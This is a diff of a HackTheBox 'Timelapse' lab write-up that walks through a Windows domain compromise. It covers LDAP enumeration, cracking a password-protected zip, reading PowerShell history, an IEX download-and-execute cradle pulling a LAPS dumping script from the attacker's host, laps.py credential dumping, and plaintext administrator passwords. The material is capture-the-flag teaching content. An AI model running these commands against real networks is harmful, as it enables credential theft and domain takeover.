@@ -1,5 +1,14 @@
-
-##### Host entries
+---
+description: >-
+  Timelapse HTB Machine
+title: Timelapse (Easy)                # Add title here
+date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
+categories: [HackTheBox, Windows - Easy]                     # Change Templates to Writeup
+tags: [hackthebox, windows, timelapse, kerberos, smb, ntp, pfx certificate, evil-winrm, powershell, history, information leakage, laps_reader]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: true                                    # Change this to true
+image: /assets/img/icons/Active.png                # Add infocard image here for post preview image
+---
+### Host entries
 ```bash
 10.10.11.152    dc01.timelapse.htb timelapse.htb
 ```
@@ -126,7 +135,7 @@ Doing NBT name scan for addresses from 10.10.11.152
 IP address       NetBIOS Name     Server    User             MAC address      
 ------------------------------------------------------------------------------
 ```
-LDAP Enumeration with nmap (nothing interesting): ^e6b5bd
+LDAP Enumeration[^ldap-enumeration] with nmap (nothing interesting):
 ```bash
 nmap -sT -Pn -n --open 10.10.11.152 -p389 --script ldap-rootdse
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 19:38 GMT
@@ -263,7 +272,7 @@ smb: \HelpDesk\> dir
 
 ### Exploitation
 
-The .zip file is password protected, so we extract its hash with zip2john and then proceed to crack it with hashcat: ^d3fbae
+The .zip file is password protected, so we extract its hash with zip2john and then proceed to crack it with hashcat[^pfx-certificate]: 
 ```bash
 zip2john winrm_backup.zip 
 ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
@@ -331,7 +340,7 @@ Description = Access denied
 WMIC.exe : ERROR:
 Description = Access denied
 ```
-A good technique for privilege escalation on Windows is to read the [[Powershell History]] located in the PATH:  ^3ceb21
+A good technique for privilege escalation on Windows is to read the [Powershell History](https://shuciran.github.io/posts/Powershell-History/) located in the PATH:  ^3ceb21
 ```powershell
 C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
@@ -366,8 +375,8 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 ```
+
 No special permissions, let's enumerate our groups:
 ```bash
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
@@ -397,7 +406,7 @@ Local Group Memberships      *Remote Management Use
 Global Group memberships     *LAPS_Readers         *Domain Users
 The command completed successfully.
 ```
-Now this is interesting, we are part of a group called "LAPS_Readers"; a good search about that group could lead us to something interesting, a good article about [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) such article give us a reference to the [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1) which is worth to check:
+Now this is interesting, we are part of a group called "LAPS_Readers"; a good search about that group could lead us to something interesting, a good article about [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) such article give us a reference to the [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1)[^Get-LAPSPasswords] which is worth to check:
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Get-LAPSPasswords.ps1')
 ```
@@ -406,11 +415,16 @@ Then by reading the exploit, we find that the Powershell module can be executed 
 Hostname   : dc01.timelapse.htb
 Stored     : 1
 Readable   : 1
-Password   : k/lUoz3pm8]1ql0R[+i3{1n2
+Password   : d2s(09pQNZ.}Q.db5,m-drS2
 Expiration : 2/11/2023 6:35:44 PM
 ```
-
 ### Post Exploitation
+Another technique to retrieve LAPS[^readlapspassword] passwords is by using the [Laps.py](https://github.com/n00py/LAPSDumper):
+```bash
+python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+LAPS Dumper - Running at 06-02-2023 04:44:09
+DC01 d2s(09pQNZ.}Q.db5,m-drS2
+```
 
 ### Credentials
 ```bash
@@ -421,16 +435,21 @@ thuglegacy
 # Credentials for user svc_deploy
 svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
 # Credentials for administrator
-administrator:k/lUoz3pm8]1ql0R[+i3{1n2
+administrator:d2s(09pQNZ.}Q.db5,m-drS2
 ```
 ### Notes
 
 - Evil-winrm can be used to authenticate with certificates, also is worth noting that if we want to authenticate via SSL we need to add the (-S) flag
 - Always lookup for hardcoded passwords on files specially on powershell history.
 - To check if we  have read access to an SMB share we need to use the `--shares` with crackmapexec or to use SMBMAP not only with SMBClient to be sure.
+
 ### References
 
-* [How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/)
-* [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) 
-* [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1) 
+- [How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/)
+- [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) 
+- [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1) 
 
+[^Get-LAPSPasswords]: Powershell Utility to read LAPS passwords
+[^readlapspassword]: Python utility to read LAPS passwords
+[^pfx-certificate]: PFX Certificate login
+[^ldap-enumeration]: LDAP Enumeration
